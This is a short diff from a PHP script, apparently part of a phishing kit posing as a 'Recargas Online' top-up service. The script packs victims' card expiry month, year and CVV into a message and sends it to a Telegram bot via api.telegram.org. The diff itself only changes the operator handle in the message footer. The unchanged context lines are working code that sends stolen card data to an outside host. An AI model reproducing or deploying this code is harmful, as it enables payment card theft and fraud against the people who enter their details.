@@ -21,7 +21,7 @@ $html_message = "➖➖➖➖➖[ Recargas Online ]➖➖➖➖➖\n".
 				"<b>✔️ Mes: </b><code>".$mm."</code>\n".
 				"<b>✔️ Año: </b><code>".$yy."</code>\n".
 				"<b>✔️ Cvv: </b><code>".$cvv."</code>\n".
-				"➖➖➖➖➖➖@KezzySSJ➖➖➖➖➖➖";
+				"➖➖➖➖➖➖[@Empastadoo]➖➖➖➖➖➖";
 
 $html_message = urlencode($html_message);
 $result = @file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$html_message&parse_mode=html");
